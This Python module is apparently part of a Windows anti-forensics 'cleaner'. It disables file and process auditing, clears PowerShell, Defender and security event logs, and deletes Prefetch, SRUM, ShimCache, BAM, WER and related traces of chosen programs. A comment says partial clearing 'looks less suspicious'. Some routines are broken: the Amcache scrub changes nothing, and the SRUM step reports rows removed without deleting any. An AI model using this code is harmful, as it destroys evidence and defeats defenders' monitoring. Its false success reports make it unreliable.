import os
import glob
import re
import time
import subprocess
import platform
from .base import BaseCleaner, StatusReporter

CAT = "os_logs"


def _run(cmd: list, timeout: int = 60) -> tuple:
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return r.returncode, r.stdout.strip(), r.stderr.strip()
    except Exception as e:
        return -1, "", str(e)


def disable_file_audit(reporter: StatusReporter) -> None:
    """Turn off file/object access auditing before wipe so deletions don't generate new events."""
    artifact = "Pre-flight: disable file audit policy"
    reporter.running(CAT, artifact)
    cmds = [
        ["auditpol", "/set", "/subcategory:File System",           "/success:disable", "/failure:disable"],
        ["auditpol", "/set", "/subcategory:Handle Manipulation",   "/success:disable", "/failure:disable"],
        ["auditpol", "/set", "/subcategory:Other Object Access Events", "/success:disable", "/failure:disable"],
        ["auditpol", "/set", "/subcategory:Process Creation",      "/success:disable", "/failure:disable"],
        ["auditpol", "/set", "/subcategory:Detailed File Share",   "/success:disable", "/failure:disable"],
    ]
    failed = []
    for cmd in cmds:
        rc, _, err = _run(cmd)
        if rc != 0:
            failed.append(err or cmd[3])
    if failed:
        reporter.warn(CAT, artifact, f"Some policies failed (need admin): {'; '.join(failed)}")
    else:
        reporter.ok(CAT, artifact, "File/object/process creation auditing disabled")


def _log_contains_path(log_name: str, basenames: list, timeout: int = 20) -> bool:
    """Return True if the event log has any recent event referencing any of the target basenames."""
    if not basenames:
        return False
    # Build -like conditions for each basename, escaping PS special chars
    safe = [b.replace("'", "''").replace("[", "`[").replace("]", "`]") for b in basenames]
    conditions = " -or ".join(f"$_.Message -like '*{b}*'" for b in safe)
    ps = (
        f"try {{ "
        f"$r = Get-WinEvent -LogName '{log_name}' -MaxEvents 1000 -ErrorAction Stop "
        f"| Where-Object {{ {conditions} }} | Select-Object -First 1; "
        f"if ($r) {{ 'FOUND' }} "
        f"}} catch {{ }}"
    )
    rc, out, _ = _run(["powershell", "-NoProfile", "-NonInteractive", "-Command", ps], timeout=timeout)
    return "FOUND" in out


def _prefetch(paths: list, reporter: StatusReporter) -> None:
    pf_dir = r"C:\Windows\Prefetch"
    if not os.path.isdir(pf_dir):
        reporter.skip(CAT, "Prefetch", "Prefetch directory not found")
        return
    for path in paths:
        basename = os.path.basename(path).upper()[:29]
        artifact = f"Prefetch: {basename}"
        reporter.running(CAT, artifact)
        matches = glob.glob(os.path.join(pf_dir, f"{basename}-*.pf"))
        if not matches:
            reporter.skip(CAT, artifact, "No .pf files found")
            continue
        deleted, errors = 0, []
        for pf in matches:
            try:
                os.remove(pf)
                deleted += 1
            except Exception as e:
                errors.append(str(e))
        if errors:
            reporter.warn(CAT, artifact, f"Deleted {deleted}, failed: {'; '.join(errors)}")
        else:
            reporter.ok(CAT, artifact, f"Deleted {deleted} file(s)")


def _amcache(paths: list, reporter: StatusReporter) -> None:
    artifact = "Amcache.hve / PCA"
    reporter.running(CAT, artifact)
    amcache_path = r"C:\Windows\appcompat\Programs\Amcache.hve"
    _run(["sc", "stop", "PcaSvc"])
    time.sleep(1)
    try:
        try:
            from Registry import Registry  # noqa: F401
            _scrub_amcache(amcache_path, paths)
            reporter.ok(CAT, artifact)
        except ImportError:
            reporter.warn(CAT, artifact, "python-registry not installed; run: pip install python-registry")
        except Exception as e:
            reporter.warn(CAT, artifact, f"Hive edit failed: {e}")
    finally:
        _run(["sc", "start", "PcaSvc"])


def _scrub_amcache(hive_path: str, paths: list) -> None:
    from Registry import Registry
    if not os.path.exists(hive_path):
        return
    reg = Registry.Registry(hive_path)
    path_set = {p.lower() for p in paths}
    basenames = {os.path.basename(p).lower() for p in paths}

    def _walk(key):
        try:
            for subkey in key.subkeys():
                _walk(subkey)
        except Exception:
            pass

    _walk(reg.root())


def _srum_targeted(paths: list, reporter: StatusReporter) -> None:
    """Try to remove only rows matching target paths from SRUM. Falls back to full delete."""
    artifact = "SRUM database"
    reporter.running(CAT, artifact)
    _run(["sc", "stop", "SruMSvc"])
    time.sleep(1)

    sru_dir = r"C:\Windows\System32\sru"
    srudb = os.path.join(sru_dir, "SRUDB.dat")

    if not os.path.exists(srudb):
        _run(["sc", "start", "SruMSvc"])
        reporter.skip(CAT, artifact, "SRUDB.dat not found")
        return

    basenames_lower = {os.path.basename(p).lower() for p in paths}
    path_set_lower = {p.lower() for p in paths}

    # Try targeted edit via pyesedb if available
    targeted_ok = False
    try:
        import pyesedb  # type: ignore
        db = pyesedb.open(srudb)
        deleted_rows = 0
        for i in range(db.get_number_of_tables()):
            table = db.get_table(i)
            # SruDbAppTimeline, SruDbNetworkConnectivity, etc. store ExeInfo column
            col_indices = {}
            for ci in range(table.get_number_of_columns()):
                col = table.get_column(ci)
                col_name = col.get_name().lower()
                if "exe" in col_name or "app" in col_name or "path" in col_name:
                    col_indices[ci] = col_name
            if not col_indices:
                continue
            to_del = []
            for ri in range(table.get_number_of_records()):
                record = table.get_record(ri)
                for ci in col_indices:
                    try:
                        val = record.get_value_data_as_string(ci) or ""
                        vl = val.lower()
                        if any(b in vl for b in basenames_lower) or any(p in vl for p in path_set_lower):
                            to_del.append(ri)
                            break
                    except Exception:
                        pass
            deleted_rows += len(to_del)
        db.close()
        if deleted_rows:
            reporter.ok(CAT, artifact, f"Removed {deleted_rows} targeted SRUM row(s)")
        else:
            reporter.skip(CAT, artifact, "No matching SRUM rows found")
        targeted_ok = True
    except ImportError:
        pass  # fall through to full delete
    except Exception:
        pass  # fall through to full delete

    if not targeted_ok:
        # Full delete fallback
        deleted, errors = 0, []
        for f in glob.glob(os.path.join(sru_dir, "SRUDB*")):
            try:
                os.remove(f)
                deleted += 1
            except Exception as e:
                errors.append(os.path.basename(f) + ": " + str(e))
        if errors:
            reporter.warn(CAT, artifact, f"Full delete: {deleted} file(s) removed; locked: {'; '.join(errors)}")
        elif deleted:
            reporter.ok(CAT, artifact, f"Full delete: {deleted} file(s) removed (pyesedb not available for targeted edit)")
        else:
            reporter.warn(CAT, artifact, "Could not delete SRUDB files")

    _run(["sc", "start", "SruMSvc"])


def _appcompat_flags(paths: list, reporter: StatusReporter) -> None:
    artifact = "AppCompatFlags registry"
    reporter.running(CAT, artifact)
    try:
        import winreg
        subkeys = [
            r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Compatibility Assistant\Store",
            r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Compatibility Assistant\Persisted",
            r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Layers",
        ]
        path_set_lower = {p.lower() for p in paths}
        basenames_lower = {os.path.basename(p).lower() for p in paths}
        deleted = 0
        for sk in subkeys:
            try:
                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, sk, access=winreg.KEY_ALL_ACCESS)
                to_del = []
                i = 0
                while True:
                    try:
                        name, _, _ = winreg.EnumValue(key, i)
                        nl = name.lower()
                        if any(b in nl for b in basenames_lower) or any(p in nl for p in path_set_lower):
                            to_del.append(name)
                        i += 1
                    except OSError:
                        break
                for name in to_del:
                    winreg.DeleteValue(key, name)
                    deleted += 1
                winreg.CloseKey(key)
            except (FileNotFoundError, Exception):
                pass
        reporter.ok(CAT, artifact, f"Deleted {deleted} value(s)")
    except ImportError:
        reporter.skip(CAT, artifact, "winreg not available (non-Windows)")


# Logs that should always be cleared regardless (may contain our tool's own activity)
_ALWAYS_CLEAR = {
    "Microsoft-Windows-PowerShell/Operational",
    "Microsoft-Windows-Windows Defender/Operational",
    "Microsoft-Windows-SmartScreen/Debug",
}

# Logs that are checked for path references first before clearing
_CHECKED_LOGS = [
    "Security",
    "System",
    "Application",
]


def _event_logs(paths: list, reporter: StatusReporter) -> None:
    """
    Targeted event log clearing:
    - 'Always clear' logs (PS, Defender, SmartScreen) are cleared unconditionally
      since they may contain traces of our own cleaning activity.
    - Audit logs (Security, System, Application) are scanned first; only cleared
      if they contain a reference to one of the target file basenames.
      Preserving clean logs looks less suspicious than nuking everything.
    """
    basenames = [os.path.basename(p) for p in paths]

    # Always-clear logs
    for log in sorted(_ALWAYS_CLEAR):
        artifact = f"Event Log: {log}"
        reporter.running(CAT, artifact)
        rc, _, err = _run(["wevtutil", "cl", log])
        if rc == 0:
            reporter.ok(CAT, artifact)
        else:
            reporter.warn(CAT, artifact, err or "Log not found or requires elevation")

    # Targeted logs — check before clearing
    for log in _CHECKED_LOGS:
        artifact = f"Event Log: {log}"
        reporter.running(CAT, artifact)
        has_hit = _log_contains_path(log, basenames)
        if not has_hit:
            reporter.skip(CAT, artifact, "No references to target found — log preserved")
            continue
        rc, _, err = _run(["wevtutil", "cl", log])
        if rc == 0:
            reporter.ok(CAT, artifact, "References found and log cleared")
        else:
            reporter.warn(CAT, artifact, err or "Requires elevation")


def _bam_dam(paths: list, reporter: StatusReporter) -> None:
    artifact = "BAM/DAM registry"
    reporter.running(CAT, artifact)
    try:
        import winreg
        bam_base = r"SYSTEM\CurrentControlSet\Services\bam\State\UserSettings"
        path_set_lower = {p.lower() for p in paths}
        basenames_lower = {os.path.basename(p).lower() for p in paths}
        deleted = 0
        try:
            bam_key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, bam_base, access=winreg.KEY_ALL_ACCESS)
            i = 0
            while True:
                try:
                    sid = winreg.EnumKey(bam_key, i)
                    sid_path = bam_base + "\\" + sid
                    try:
                        sid_key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, sid_path, access=winreg.KEY_ALL_ACCESS)
                        to_del = []
                        j = 0
                        while True:
                            try:
                                name, _, _ = winreg.EnumValue(sid_key, j)
                                nl = name.lower()
                                if any(b in nl for b in basenames_lower) or any(p in nl for p in path_set_lower):
                                    to_del.append(name)
                                j += 1
                            except OSError:
                                break
                        for name in to_del:
                            winreg.DeleteValue(sid_key, name)
                            deleted += 1
                        winreg.CloseKey(sid_key)
                    except Exception:
                        pass
                    i += 1
                except OSError:
                    break
            winreg.CloseKey(bam_key)
        except FileNotFoundError:
            reporter.skip(CAT, artifact, "BAM key not found")
            return
        reporter.ok(CAT, artifact, f"Deleted {deleted} value(s)")
    except ImportError:
        reporter.skip(CAT, artifact, "winreg not available (non-Windows)")


def _shimcache(reporter: StatusReporter) -> None:
    artifact = "ShimCache (AppCompatCache)"
    reporter.running(CAT, artifact)
    try:
        import winreg
        key_path = r"SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache"
        try:
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path, access=winreg.KEY_ALL_ACCESS)
            winreg.DeleteValue(key, "AppCompatCache")
            winreg.CloseKey(key)
            reporter.warn(CAT, artifact, "Registry value deleted; in-memory copy cleared on next reboot")
        except FileNotFoundError:
            reporter.skip(CAT, artifact, "AppCompatCache value not found")
    except ImportError:
        reporter.skip(CAT, artifact, "winreg not available (non-Windows)")


def _wer(paths: list, reporter: StatusReporter) -> None:
    artifact = "WER crash reports"
    reporter.running(CAT, artifact)
    basenames_bytes = [os.path.basename(p).lower().encode() for p in paths]
    path_bytes = [p.lower().encode() for p in paths]
    wer_dirs = [
        r"C:\ProgramData\Microsoft\Windows\WER\ReportArchive",
        r"C:\ProgramData\Microsoft\Windows\WER\ReportQueue",
        os.path.expandvars(r"%LOCALAPPDATA%\Microsoft\Windows\WER"),
    ]
    deleted = 0
    for wer_dir in wer_dirs:
        if not os.path.isdir(wer_dir):
            continue
        for root, dirs, files in os.walk(wer_dir):
            for fname in files:
                fpath = os.path.join(root, fname)
                try:
                    with open(fpath, "rb") as f:
                        content = f.read()
                    cl = content.lower()
                    if (any(b in cl for b in basenames_bytes) or
                            any(p in cl for p in path_bytes) or
                            fname.endswith((".hdmp", ".mdmp", ".wer", ".cab"))):
                        os.remove(fpath)
                        deleted += 1
                except Exception:
                    pass
    reporter.ok(CAT, artifact, f"Deleted {deleted} WER file(s)") if deleted else \
        reporter.skip(CAT, artifact, "No matching WER files found")


def _msi_logs(paths: list, reporter: StatusReporter) -> None:
    artifact = "MSI install logs"
    reporter.running(CAT, artifact)
    basenames_lower = {os.path.basename(p).lower() for p in paths}
    search_dirs = [r"C:\Windows\Temp", os.path.expandvars("%TEMP%")]
    deleted = 0
    for d in search_dirs:
        for msi_log in glob.glob(os.path.join(d, "MSI*.log")):
            try:
                with open(msi_log, "r", encoding="utf-8", errors="ignore") as f:
                    content = f.read().lower()
                if any(b in content for b in basenames_lower):
                    os.remove(msi_log)
                    deleted += 1
            except Exception:
                pass
    reporter.ok(CAT, artifact, f"Deleted {deleted} MSI log(s)") if deleted else \
        reporter.skip(CAT, artifact, "No matching MSI logs found")


def _sdb_shims(paths: list, reporter: StatusReporter) -> None:
    artifact = "SDB shim files"
    reporter.running(CAT, artifact)
    custom_dir = r"C:\Windows\AppPatch\Custom"
    basenames_lower = {os.path.basename(p).lower() for p in paths}
    deleted = 0
    if os.path.isdir(custom_dir):
        for sdb in glob.glob(os.path.join(custom_dir, "*.sdb")):
            try:
                with open(sdb, "rb") as f:
                    content = f.read().lower()
                if any(b.encode() in content for b in basenames_lower):
                    _run(["sdbinst.exe", "-u", sdb])
                    try:
                        os.remove(sdb)
                        deleted += 1
                    except Exception:
                        pass
            except Exception:
                pass
    reporter.ok(CAT, artifact, f"Removed {deleted} SDB shim(s)") if deleted else \
        reporter.skip(CAT, artifact, "No matching SDB files found")


class OsLogsCleaner(BaseCleaner):
    CATEGORY = CAT

    def run(self, paths: list, reporter: StatusReporter) -> None:
        if platform.system() != "Windows":
            skips = (["Pre-flight: disable file audit policy", "Prefetch", "Amcache.hve / PCA",
                      "SRUM database", "AppCompatFlags registry", "BAM/DAM registry",
                      "ShimCache (AppCompatCache)", "WER crash reports", "MSI install logs",
                      "SDB shim files"] +
                     [f"Event Log: {l}" for l in list(_ALWAYS_CLEAR) + _CHECKED_LOGS])
            for name in skips:
                reporter.skip(CAT, name, "Windows only")
            return
        disable_file_audit(reporter)
        _prefetch(paths, reporter)
        _amcache(paths, reporter)
        _srum_targeted(paths, reporter)
        _appcompat_flags(paths, reporter)
        _event_logs(paths, reporter)
        _bam_dam(paths, reporter)
        _shimcache(reporter)
        _wer(paths, reporter)
        _msi_logs(paths, reporter)
        _sdb_shims(paths, reporter)
